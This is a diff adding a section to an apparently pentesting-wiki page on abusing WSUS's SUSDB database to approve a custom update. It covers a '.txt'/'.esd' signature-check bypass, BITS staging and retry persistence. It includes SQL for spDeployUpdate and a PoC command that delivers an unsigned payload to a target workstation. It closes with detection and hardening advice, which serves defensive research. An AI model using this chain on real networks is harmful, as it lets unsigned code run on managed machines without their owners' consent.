@@ -250,6 +250,77 @@ Basically, this is the flaw that this bug exploits:
 
 You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
 
+### SUSDB custom-update abuse: unsigned payloads via `.txt`/`.esd`
+
+This is a different trust-boundary failure from intercepting an HTTP WSUS connection: the prerequisite is enough access to the **WSUS database (`SUSDB`) stored procedures** to publish and approve a custom update. One practical entry path is relaying an upstream WSUS computer account to a separate MSSQL server hosting `SUSDB`; the exact prerequisite is deployment-specific, so first enumerate `EXECUTE` permissions instead of assuming SQL administrator rights.<sup>[[38]](#references)[[39]](#references)</sup>
+
+For the separate attack path that relays WSUS client authentication from HTTP/8530 to LDAP, SMB, or AD CS, see [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).
+
+#### Build, target and approve the update
+
+The custom-update workflow uses legitimate WSUS procedures as a restricted publishing API. The important state transitions are:<sup>[[38]](#references)</sup>
+
+| Stage | Relevant stored procedures |
+| --- | --- |
+| Import update metadata | `spImportUpdate` |
+| Store prerequisite, localized and extended XML fragments | `spSaveXMLFragment` |
+| Associate the content digest with its attacker-controlled URL | `spSetBatchURL` |
+| Enumerate/create a computer group and add the client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
+| Approve installation for that group | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |
+
+The file name, digests, size and `CommandLineInstallation` handler must agree across the imported metadata/fragments. After assigning the content URL and target group, the final approval resembles the following; use fresh update, group and deployment identifiers rather than replaying example GUIDs.<sup>[[38]](#references)[[39]](#references)</sup>
+
+```sql
+EXEC spDeployUpdate
+  @updateID = '<update-guid>', @revisionNumber = 1,
+  @actionID = 0, @targetGroupID = '<group-guid>',
+  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
+  @adminName = 'Administrator';
+```
+
+#### Extension-driven signature bypass
+
+WSUS normally rejects arbitrary unsigned executable content. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, however, the .NET `VerifyFile` path sets its certificate-check flag to false when the supplied filename ends in `.txt` or `.esd`; `CheckCertificateSignature` is then skipped without first proving that the bytes are text or a legitimate ESD image. Therefore an unchanged PE named, for example, `payload.exe.txt` can pass content verification and later be launched by the update's command-line installation handler. This is a policy/type-confusion bug, not signature forgery.<sup>[[39]](#references)</sup>
+
+```csharp
+bool checkSignature = true;
+if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
+    checkSignature = false;
+if (checkSignature)
+    CheckCertificateSignature(/* downloaded file */);
+```
+
+#### BITS-compatible staging and automation
+
+Calling `spDeployUpdate` makes WSUS fetch the registered content. The origin must satisfy BITS' HTTP expectations: a reachable URL alone is insufficient because the transfer uses an initial `HEAD`/`GET` flow and byte-range requests. A server without Range support produces WSUS synchronization `EventId=364` stating that BITS requires the Range protocol header.<sup>[[39]](#references)</sup>
+
+The research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generates the SQL required for the import/fragment/URL/group/deployment chain, includes a modified MSSQL client for executing it, and ships `BitsWebServer.py` for content staging. A minimal authorized-lab invocation is:<sup>[[40]](#references)</sup>
+
+```bash
+python3 NotWSUSpicious.py \
+  --wsusHostname wsus.lab.local \
+  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
+  --updateName SecurityUpdate \
+  --updateFilePath /payloads/payload.exe.txt \
+  --updateArguments '' \
+  --computerGroup TestGroup \
+  --targetComputer workstation.lab.local
+python3 BitsWebServer.py
+```
+
+#### Unattended execution and retry persistence
+
+Client-side interaction depends on policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, option `4 - Auto download and schedule install`, makes an approved update download and install on the configured schedule without the user manually selecting it. In testing, a payload whose update remained failed/incomplete was immediately offered again after the callback process exited, so retry behavior can become recurring execution persistence; it is noisy because the client exposes an update-failed state.<sup>[[39]](#references)</sup>
+
+#### Detection and hardening pivots
+
+Useful server- and client-side pivots from this chain are:<sup>[[39]](#references)</sup>
+
+- Audit `SUSDB` execution of `spCreateTargetGroup`, `spSetBatchURL` and `spDeployUpdate`; investigate new targeting groups, external content origins, `.txt`/`.esd` update payloads and deployments performed by unexpected principals (especially non-computer accounts).
+- Review `C:\Program Files\Update Services\LogFiles` for `ContentSyncAgent`, `FileVerified`, the misspelled `FileVerficationFailed`, and `EventId=364`; correlate verification with payload extension and content magic rather than trusting the suffix.
+- Hunt for Windows Update installation repeatedly failing/retrying and for PE execution or unexpected child/network activity from content carrying `.txt` or `.esd` names.
+- Require Extended Protection for Authentication on the database service where supported, and restrict database network access to the WSUS server and authorized administrative systems. Minimize and audit `EXECUTE` rights on the custom-update procedures.
+
 ## Third-Party Auto-Updaters and Agent IPC (local privesc)
 
 Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:
@@ -2197,5 +2268,8 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
 - [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation When An Image Change Leads To A Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
 - [37] [blog.ropnop.com - Extracting Ssh Private Keys From Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
+- [38] [SpecterOps – Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
+- [39] [SpecterOps – Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
+- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
 
 {{#include ../../banners/hacktricks-training.md}}
